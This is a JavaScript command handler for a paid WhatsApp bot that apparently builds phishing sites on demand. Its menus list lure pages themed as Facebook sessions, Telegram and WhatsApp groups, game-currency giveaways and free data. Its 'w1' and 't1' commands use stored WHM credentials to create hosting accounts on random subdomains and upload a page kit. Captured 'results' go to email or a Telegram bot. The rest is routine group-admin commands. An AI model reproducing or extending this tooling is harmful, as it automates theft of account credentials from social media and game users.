const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins,updateDatabase } = require('./lib/functions.js')
const { exec } = require('child_process')
const fs = require('fs')
const request = require("request")
module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
var domainCF = "safe-website.me";
var baseURL = "https://krisnastore.my.id/api-bot/";
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
0
// kirimprib(hasillrndy
const kirimprib =async(text,id) => { await semar.sendMessage(id,{text: text},{quoted:msg}) }
//ALL DATABASE
server = JSON.parse(fs.readFileSync('./database/server.json'))
grups = JSON.parse(fs.readFileSync('./database/grups.json'))
switch (command) {

    case 'menu' :
        namamu = msg.pushName
     id = msg.key.remoteJid
        if(validGrup(id,grups)){

        menu =`
*_WARNING!_*
If you want results to go to telegram please use the telegram menu and vice versa if you want results to go to email please use the email menu.
Thank You...

*_Peringatan!_*
Jika ingin hasil masuk ke telegram silahkan menggunakan menu telegram begitu juga sebaliknya jika ingin hasil masuk ke email silahkan menggunakan menu email.
Terima kasih...

┌─❖
│ Hi 👋 
└┬❖  *${namamu}*
│└────────────┈ ⳹
│ *_Script By KrisnaHost_*
└┬────────────┈ ⳹
   │✑  *Follow My Instagram :*
   │✑  @wahyu.krsnaa
 └─────────────┈ ⳹
┏━━⊱ *_MENU_* 
┣❏ .email ⟶ Result to Email
┣❏ .telegram ⟶ Result to Telegram
┗━━⊱ Created By KrisnHost <<<
`
reply(menu)

        }else{
            reply(`
*_ERROR, PAY FIRST...!!!_*
*_Rent Bots? Contact Developer_*
_http://wa.me/6287784550689_

*Need Web? Let's join!*


*_ERROR, BAYAR DULU...!!!_*
*_Sewa Bot? Kontak Developer_*
_http://wa.me/6287784550689_

*Butuh Web? Mari bergabung!*

`)
        }
        break
 





     
     case 'update':
        if (!isOwner && !msg.key.fromMe) return reply('This feature can only be used by the owner!')
        
            if(args == ""){
            psn = `
*Type _.update group | The Group ID_ to add a group*
            `
            reply(psn)
            }else{
                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `
*_SUCCESS_*
_SUCCESSFUL ADD GROUP_


*Note :*
_No Spam Give Bot Delay 2-3 Minutes_
`
            reply(info)
                }
                
            }
            
            break
            
            
        case 'listgrup':
if (!isOwner && !msg.key.fromMe) return reply('This feature can only be used by the owner!')
        let text = "LIST GRUP VIP :\n\n"
            for (let i = 0; i < grups.length; i++) {
                text += "> "+ grups[i] + "\n";
            }
            reply(text)
            
            
            break    
            case 'addgroup':
            if (!isOwner && !msg.key.fromMe) return reply('This feature can only be used by the owner!')
                id = msg.key.remoteJid
                pengirim = msg.key.participant
                nama = msg.pushName
          

    await semar.sendMessage(pengirim,{text: `.update group | ${id}`},{quoted:msg})

            break 

case 'ping' :
    ping = `*_BOT RUNNING_*`
reply(ping)
break

case 'w2' :
case 'w3' :
case 'w4' :
case 'w5' :
case 'w6' :
case 'w7' :
case 'w8' :
case 'w9' :
case 'w10' :
case 'w11' :
case 'w12' :
case 'w13' :
case 'w14' :
case 'w15' :
case 'w16' :
case 'w17' :
case 'w18' :
case 'w19' :
case 'w20' :
case 'w21' :
case 'w22' :
case 't2' :
case 't3' :
case 't4' :
case 't5' :
case 't6' :
case 't7' :
case 't8' :
case 't9' :
case 't10' :
case 't11' :
case 't12' :
case 't13' :
case 't14' :
case 't15' :
case 't16' :
case 't17' :
case 't18' :
case 't19' :
case 't20' :
case 't21' :
case 't22' :
    maintenance = `
*_COMING SOON..._*
_Features are still under development_
`
reply(maintenance)
break





case 'email' :
    email = `
*_INFORMATION_*
This bot is still under development and will be updated regularly, so please use the existing one while waiting for an update from the developer.
Since this bot is free, there are no sponsors... 😝

*_INFORMASI_*
Bot ini masih dalam tahap pengembangan dan akan diupdate secara berkala, jadi silahkan gunakan yang sudah ada sambil menunggu update dari developer.
Karena bot ini gratis, tidak ada sponsor... 😝

*「 WEB EMAIL MENU 」*
➭.w1 : TELEGRAM GROUP v1
➭.w2 : TELEGRAM GROUP v2
➭.w3 : WHATSAPP GROUP v1
➭.w4 : WHATSAPP GROUP v2
➭.w5 : FREEFIRE CODASHOP
➭.w6 : FREEFIRE SPIN
➭.w7 : FREEFIRE CLAIM
➭.w8 : MLBB CLAIM
➭.w9 : MLBB SPIN 
➭.w10 : FACEBOOK BLOCKING
➭.w11 : FACEBOOK SESSION v1
➭.w12 : FACEBOOK SESSION v2
➭.w13 : FACEBOOK LIVE 
➭.w14 : MEDIAFIRE v1
➭.w15 : MEDIAFIRE v2
➭.w16 : PUBGM CLAIM
➭.w17 : PUBGM SPIN v1
➭.w18 : PUBGM SPIN v2
➭.w19 : YOUTUBE 18+
➭.w20 : STUMBLE GUYS CLAIM
➭.w21 : KUOTA GRATIS (INDO ONLY)
➭.w22 : DANA KAGET (INDO ONLY)
╚═══[ *_KrisnaBotz_* ]═══⊱

Type : *.w1* to create web.
PLEASE GIVE BOT DELAY 1-3 MINUTES BECAUSE IT USES A LOT🙏

Ketik : *.w1* untuk membuat web.
TOLONG BERI DELAY BOT 1-3 MENIT KARENA YANG PAKAI BANYAK🙏
`
reply(email)
break

//LIST WEB RESULT TELEGRAM BOT
case 'telegram' :
    telegram = `
*_INFORMATION_*
This bot is still under development and will be updated regularly, so please use the existing one while waiting for an update from the developer.
Since this bot is free, there are no sponsors... 😝

*_INFORMASI_*
Bot ini masih dalam tahap pengembangan dan akan diupdate secara berkala, jadi silahkan gunakan yang sudah ada sambil menunggu update dari developer.
Karena bot ini gratis, tidak ada sponsor... 😝

*「 WEB TELEGRAM MENU 」*
➭.t1 : TELEGRAM GROUP v1
➭.t2 : TELEGRAM GROUP v2
➭.t3 : WHATSAPP GROUP v1
➭.t4 : WHATSAPP GROUP v2
➭.t5 : FREEFIRE CODASHOP
➭.t6 : FREEFIRE SPIN
➭.t7 : FREEFIRE CLAIM
➭.t8 : MLBB CLAIM
➭.t9 : MLBB SPIN 
➭.t10 : FACEBOOK BLOCKING
➭.t11 : FACEBOOK SESSION v1
➭.t12 : FACEBOOK SESSION v2
➭.t13 : FACEBOOK LIVE 
➭.t14 : MEDIAFIRE v1
➭.t15 : MEDIAFIRE v2
➭.t16 : PUBGM CLAIM
➭.t17 : PUBGM SPIN v1
➭.t18 : PUBGM SPIN v2
➭.t19 : YOUTUBE 18+
➭.t20 : STUMBLE GUYS CLAIM
➭.t21 : KUOTA GRATIS (INDO ONLY)
➭.t22 : DANA KAGET (INDO ONLY)
╚═══[ *_KrisnaBotz_* ]═══⊱

Type : *.t1* to create web.
PLEASE GIVE BOT DELAY 1-3 MINUTES BECAUSE IT USES A LOT🙏

Ketik : *.t1* untuk membuat web.
TOLONG BERI DELAY BOT 1-3 MENIT KARENA YANG PAKAI BANYAK🙏
`
reply(telegram)
break


// WEBSITE 1 EMAIL
case 'w1' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "telegram" + makeid(9) + "." +domainCF


        namamu = msg.pushName
        idmu = msg.key.participant
        reply(`
*_Currently building a Web..._*
_Don't spam, it's still being processed..._

*_Sedang membuat Web..._*
_Jangan Spam, Lagi di proses..._
`)


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            domain: domain
        }

        request.post({
            url: baseURL+'telegram/limapuluh/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply(`
                    *Process...*
                    _Don't Spam, It will be finished soon_

                    *Proses...*
                    _Jangan Spam, Sebentar lagi selesai_
                    `)
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot
                }

                request.post({
                    url: baseURL+'telegram/limapuluh/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    
hasillrndy = `
*IMPORTANT :*
➟ Wait 1-3 minutes for the web to be ready to use.
Thank You...

➟ Before using, don't forget to start the bot first...
Click Start Bot https://t.me/KrisnaResult_bot

*PENTING :*
➟ Tunggu 1-3 menit hingga web siap digunakan.
Terima kasih...

➟ Sebelum menggunakan, jangan lupa untuk memulai bot terlebih dahulu...
Klik Mulai Bot https://t.me/KrisnaResult_bot


*[ TRY IT BEFORE USE ]*
*=====================================*
*➢ Website :*
➦ https://${domain}
*=====================================*
*➢ Result Setting :*
➦ https://${domain}/vhlskd1cv/krisnaxd.php
*=====================================*

*_Script by KrisnaHost © 2023_*
`


                    reply(`
*_Hi ${namamu}_*
*_Successfully creating a web..._*


*_Hai ${namamu}_*
*_Sukses membuat web..._*
`, idmu)
                    kirimprib(hasillrndy, idmu)  
                })
                }else {
                reply("_Connection Lost, Please Contact http://wa.me/6287784550689_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply(`
*_ERROR, PAY FIRST...!!!_*
*_Rent Bots? Contact Developer_*
_http://wa.me/6287784550689_

*Need Web? Let's join!*


*_ERROR, BAYAR DULU...!!!_*
*_Sewa Bot? Kontak Developer_*
_http://wa.me/6287784550689_

* Butuh Web? Mari bergabung!*

`)
        }
break
// WEBSITE 1 TELEGRAM
case 't1' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "telegram" + makeid(9) + "." +domainCF


        namamu = msg.pushName
        idmu = msg.key.participant
        reply(`
*_Currently building a Web..._*
_Don't spam, it's still being processed..._

*_Sedang membuat Web..._*
_Jangan Spam, Lagi di proses..._
`)


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            domain: domain
        }

        request.post({
            url: baseURL+'telegram/limapuluh/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply(`
                    *Process...*
                    _Don't Spam, It will be finished soon_

                    *Proses...*
                    _Jangan Spam, Sebentar lagi selesai_
                    `)
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot
                }

                request.post({
                    url: baseURL+'telegram/limapuluh/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    
hasillrndy = `
*IMPORTANT :*
➟ Wait 1-3 minutes for the web to be ready to use.
Thank You...

➟ Before using, don't forget to start the bot first...
Click Start Bot https://t.me/KrisnaResult_bot

*PENTING :*
➟ Tunggu 1-3 menit hingga web siap digunakan.
Terima kasih...

➟ Sebelum menggunakan, jangan lupa untuk memulai bot terlebih dahulu...
Klik Mulai Bot https://t.me/KrisnaResult_bot


*[ TRY IT BEFORE USE ]*
*=====================================*
*➢ Website :*
➦ https://${domain}
*=====================================*
*➢ Result Setting :*
➦ https://${domain}/vhlskd1cv/krisnaxd.php
*=====================================*

*_Script by KrisnaHost © 2023_*
`


                    reply(`
*_Hi ${namamu}_*
*_Successfully creating a web..._*


*_Hai ${namamu}_*
*_Sukses membuat web..._*
`, idmu)
                    kirimprib(hasillrndy, idmu)  
                })
                }else {
                reply("_Connection Lost, Please Contact http://wa.me/6287784550689_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply(`
*_ERROR, PAY FIRST...!!!_*
*_Rent Bots? Contact Developer_*
_http://wa.me/6287784550689_

*Need Web? Let's join!*


*_ERROR, BAYAR DULU...!!!_*
*_Sewa Bot? Kontak Developer_*
_http://wa.me/6287784550689_

*Butuh Web? Mari bergabung!*

`)
        }
break
//AKHIR CASE WEB





// CREATED BY KRISNA HOST






// CASE LAINNYA
case 'grup':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (args.length < 1) return reply("silahkan pilih grup open/close")
if (args[0] === 'open'){ await semar.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'close'){ await semar.groupSettingUpdate(from, 'announcement')} else { reply('yang bener lah pantek')}
break

case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

case 'leave':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from)
break

case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 restart index`, (error, stdout, stderr) => {
    reply("*_SUCCESS RESTART BOT_*")
    reply(stdout)
})
break

case 'shutdown':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break
default:
}} catch (e) {
console.log(e)
}
}